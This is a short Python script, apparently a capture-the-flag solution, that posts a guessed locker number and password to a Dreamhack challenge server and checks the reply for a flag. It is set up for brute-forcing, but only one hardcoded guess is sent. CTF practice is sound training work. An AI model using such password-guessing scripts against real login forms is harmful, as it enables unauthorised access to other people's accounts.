






import requests


HOST = "http://host3.dreamhack.games:23194/"


import string
# brute locker_num
alphanumeric =  string.ascii_lowercase + string.digits
alphanumeric = list (alphanumeric)

print(alphanumeric)
# brute number  
my_val = "axlm"
# print(my_val)
num = 131
DATA = {
    "locker_num":f"{my_val}",
    "password":f"{num}"
}

r = requests.post(url=HOST, data=DATA)
if "FLAG:" in r.text:
    print(f"FOUND {num} {my_val} FINAL FINAL FINAL")
    print(r.text)

    












